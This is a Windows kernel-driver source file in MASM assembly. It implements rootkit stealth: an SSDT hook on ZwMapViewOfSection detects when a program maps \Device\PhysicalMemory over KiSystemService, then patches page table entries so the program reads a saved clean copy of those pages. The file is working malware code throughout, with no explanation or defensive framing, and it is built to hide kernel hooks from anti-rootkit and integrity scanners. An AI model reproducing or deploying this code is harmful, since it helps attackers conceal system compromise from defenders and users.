;------------------------------------------------------------------------------
; hooks.inc
;------------------------------------------------------------------------------

InstallHooks		PROTO
UninstallHooks		PROTO
HookIofCallDriver	PROTO
UnhookIofCallDriver	PROTO
PathFromHandle		PROTO	:DWORD, :DWORD, :DWORD
MapKiSystemService	PROTO
ChangePTEofTarget	PROTO	:DWORD, :DWORD

MAXPATHLEN EQU 1024

.data?
 originalZwMapViewOfSectionAddr	dd ?
 idZwMapViewOfSection		dd ?
 
 addrOfPtrIofCallDriver		dd ?
 trueIofCallDriver		dd ?

 glNewZwMapOut			dd ?
 hookInSystem			dd ?

 vaKiSystemService		dd ?
 phKiSystemService		dd ?
 vaKiSSrounded			dd ?
 phKiSSrounded			dd ?
 phKiSSroundedUp		dd ?
 phFakeBuffer0			dd ?
 phFakeBuffer1			dd ?
 phFakeBuffer2			dd ?
 returnSectionOffset		dd ?
 returnBaseAddress		dd ?
 returnViewSize			dd ?

.data 
 IofHookInstaled		dd 0
 HooksInstaled			dd 0
 IsFromDriverUnload		dd 0
 IsFromNewZwMap			dd 0
 fakeKiSystemServiceBuffer	dd 0
 IsToFool			dd 0
 IsDevicePhysical		dd 0

.code
;-----------------------------------------------------------------------------------------------------------
; NewZwMapViewOfSection hook function
;-----------------------------------------------------------------------------------------------------------
NewZwMapViewOfSection proc SectionHandle:DWORD, ProcessHandle:DWORD, BaseAddress:DWORD, ZeroBits:DWORD, \
                           CommitSize:DWORD, SectionOffset:DWORD, ViewSize:DWORD, InheritDisposition:DWORD, \
                           AllocationType:DWORD, Protect:DWORD

	local retBaseAddress:DWORD
	local wfszPathFromHandle:DWORD
	local tmpAnsiDevicePhys:ANSI_STRING
	local tmpAnsiPathFromHandle:ANSI_STRING

	pushad
	invoke ExAllocatePoolWithTag, PagedPool, MAXPATHLEN, '1gde'
	.if eax != NULL
		mov wfszPathFromHandle, eax
		invoke PathFromHandle, SectionHandle, NULL, wfszPathFromHandle
		.if eax == TRUE
			invoke RtlInitAnsiString, addr tmpAnsiDevicePhys, $CTA0("\\Device\\PhysicalMemory")
			invoke RtlInitAnsiString, addr tmpAnsiPathFromHandle, wfszPathFromHandle
			invoke RtlCompareString, addr tmpAnsiDevicePhys, addr tmpAnsiPathFromHandle, TRUE
			.if eax == 0
				pushad

					mov eax, BaseAddress
					mov returnBaseAddress, eax

					mov eax, SectionOffset
					mov returnSectionOffset, eax
					mov eax, [eax]
				
					mov ebx, ViewSize
					mov returnViewSize, ebx
					mov ebx, [ebx]

					cmp eax, phKiSSrounded
					jl @F
					add eax, ebx
					cmp eax, phKiSSroundedUp
					jg @F
						mov IsToFool, 1					
					@@:

				popad
			.endif
		.endif
		invoke ExFreePool, wfszPathFromHandle
	.endif
	popad

	mov eax, BaseAddress
	mov retBaseAddress, eax

	lea eax, hkZwMapOut
	mov glNewZwMapOut, eax

	invoke UninstallHooks

	lea eax, InstallHooks
	mov IsFromNewZwMap, 1

	push Protect
	push AllocationType
	push InheritDisposition
	push ViewSize
	push SectionOffset
	push CommitSize
	push ZeroBits
	push BaseAddress
	push ProcessHandle
	push SectionHandle

	push eax ; <<--- the new RETURN address
	jmp dword ptr [originalZwMapViewOfSectionAddr]

	hkZwMapOut:

	mov IsFromNewZwMap, 0
	ret
NewZwMapViewOfSection endp

;------------------------------------------------------------------------------
; Install the hooks
;------------------------------------------------------------------------------
InstallHooks proc

	pushad
	;-----------------------------------------------------------------
	; Get ServiceID of _ZwMapViewOfSection kernel function
	;-----------------------------------------------------------------
	mov eax, [ZwMapViewOfSection]
	add eax, 2
	mov eax, [eax]
	mov eax, [eax] ; Now eax = ptr to _ZwMapViewOfSection
	mov eax, [eax+01] ; E8 XX 00 00 00 : mov eax, XX (service number)
	mov idZwMapViewOfSection, eax
	;-----------------------------------------------------------------
	; Hook the _NtMapViewOfSection kernel function
	;-----------------------------------------------------------------
	
	;pushad
	;invoke HookInSystemProcess
	;mov hookInSystem, eax
	;popad

	.if IsToFool == 1

		push eax
		push ebx
		push ecx
		push edx

		mov ebx, returnSectionOffset
		mov ebx, [ebx]
		cmp ebx, phKiSSrounded
		jne @F
		xor edx, edx
		mov eax, returnViewSize
		mov eax, [eax]
		mov ecx, 01000h
		div cx

		mov eax, returnBaseAddress
		mov eax, [eax]
		invoke ChangePTEofTarget, eax, fakeKiSystemServiceBuffer

	@@:
		mov IsToFool, 0

		pop edx
		pop ecx
		pop ebx
		pop eax
	.endif		

	invoke HookSSDTfunction, eax, addr NewZwMapViewOfSection
	mov originalZwMapViewOfSectionAddr, eax	

	mov HooksInstaled, 1
	popad
	.if IsFromNewZwMap == 1
		jmp dword ptr [glNewZwMapOut]
	.endif
	ret

InstallHooks endp


;------------------------------------------------------------------------------
; Uninstall the hooks
;------------------------------------------------------------------------------
UninstallHooks proc

	pushad
	mov eax, idZwMapViewOfSection
	invoke HookSSDTfunction, eax, originalZwMapViewOfSectionAddr
	mov HooksInstaled, 0
	popad
	ret

UninstallHooks endp



;------------------------------------------------------------------------------
; PathFromHandle
;------------------------------------------------------------------------------
PathFromHandle proc uses ebx ecx edx hKey:DWORD, lpstObName:DWORD, lpUnStr:DWORD

	local pKey:DWORD
	local keyname:ANSI_STRING	
	local tmpname:DWORD
	local fullUniName:DWORD
	local actualLen:ULONG
	local status:DWORD

	mov status, FALSE

	invoke ExAllocatePoolWithTag, PagedPool, MAXPATHLEN, '4gde'
	.if eax != NULL
		mov tmpname, eax
		mov byte ptr [eax], "0"
		mov eax, lpUnStr
		mov byte ptr [eax], "0"
		;----------------------------------------------------------------------------
		; return a pointer in pKey to the OBJECT_BODY
		;----------------------------------------------------------------------------
		invoke ObReferenceObjectByHandle, hKey, 0, NULL, KernelMode, addr pKey, NULL
		.if eax == STATUS_SUCCESS
			;----------------------------------------------------------------------
			; It is the same of (MAXPATHLEN * 2 + sizeof(UNICODE_STRING)
			;----------------------------------------------------------------------
			invoke ExAllocatePoolWithTag, PagedPool, (MAXPATHLEN * 2 + 2 * sizeof(ULONG)), '5gde'
			.if eax != NULL
				mov fullUniName, eax
				mov ebx, eax
				mov (UNICODE_STRING PTR [ebx]).MaximumLength, MAXPATHLEN * 2
				;-------------------------------------------------------------------
				; Get the OBJECT name 
				;-------------------------------------------------------------------
				invoke ObQueryNameString, pKey, ebx, MAXPATHLEN, addr actualLen
				.if eax == STATUS_SUCCESS
					invoke RtlUnicodeStringToAnsiString, addr keyname, fullUniName, TRUE
					.if eax == STATUS_SUCCESS
						mov status, TRUE
						lea eax, keyname
						mov ebx, (ANSI_STRING PTR [eax]).Buffer
						invoke strcpy, lpUnStr, ebx
						invoke RtlFreeAnsiString, addr keyname
					.endif
				.endif			
				mov ebx, fullUniName
				invoke ExFreePool, ebx
			.else
				invoke DbgPrint, $CTA0("Allocation in PathFromHandle failed...\n")
			.endif
			invoke ObDereferenceObject, pKey
		.endif

		invoke ExFreePool, tmpname
	.endif
	mov eax, status
	ret
PathFromHandle endp

MapKiSystemService proc uses ebx ecx edx
	invoke ExAllocatePool, NonPagedPool, 03000h
	.if eax != NULL
		mov fakeKiSystemServiceBuffer, eax
		invoke GetKeServiceDescriptorTable
		mov eax, [eax]	; Eax = ptr to _KiSystemService
		mov vaKiSystemService, eax
		mov ebx, eax
		and ebx, 0FFFFF000h
		mov vaKiSSrounded, ebx
		invoke memcpy, fakeKiSystemServiceBuffer, ebx, 03000h
		mov eax, vaKiSystemService
		invoke MmGetPhysicalAddress, eax
		mov phKiSystemService, eax
		mov eax, vaKiSSrounded
		invoke MmGetPhysicalAddress, eax
		mov phKiSSrounded, eax
		add eax, 03000h
		mov phKiSSroundedUp, eax
		mov ebx, fakeKiSystemServiceBuffer
		invoke MmGetPhysicalAddress, ebx
		mov phFakeBuffer0, eax
		add ebx, 01000h
		invoke MmGetPhysicalAddress, ebx
		mov phFakeBuffer1, eax
		add ebx, 01000h
		invoke MmGetPhysicalAddress, ebx
		mov phFakeBuffer2, eax
		

		pushad
		invoke DbgPrint, $CTA0("\nphKiSystemService: %08X phKiSSrounded: %08X\n"), phKiSystemService, phKiSSrounded
		invoke DbgPrint, $CTA0("phFakeBuffer0: %08X phFakeBuffer1: %08X phFakeBuffer2: %08X\n"), phFakeBuffer0, phFakeBuffer1, phFakeBuffer2
		popad

	.endif
	mov eax,  fakeKiSystemServiceBuffer
	ret
MapKiSystemService endp

ChangePTEofTarget proc uses eax ebx, vaTarget:DWORD, _newVirtualAddr:DWORD

	LOCAL vaTargetPTEaddr:DWORD
	LOCAL vaTargetPTE:DWORD
	LOCAL NewVAPTEaddr:DWORD
	LOCAL NewVAPTE:DWORD

	mov eax, vaTarget
	shr eax, 12
	shl eax, 2
	mov ebx, 0c0000000h
	add ebx, eax
	mov vaTargetPTEaddr, ebx
	mov eax, [ebx]
	mov vaTargetPTE, eax

	mov eax, _newVirtualAddr
	shr eax, 12
	shl eax, 2
	mov ebx, 0c0000000h
	add ebx, eax
	mov NewVAPTEaddr, ebx
	mov eax, [ebx]
	mov NewVAPTE, eax

	and eax, 0FFFFF000h
	mov ebx, vaTargetPTE
	and ebx, 0FFFh
	add eax, ebx

	cli
	mov ebx, vaTargetPTEaddr
	mov [ebx], eax
	sti

	ret
ChangePTEofTarget endp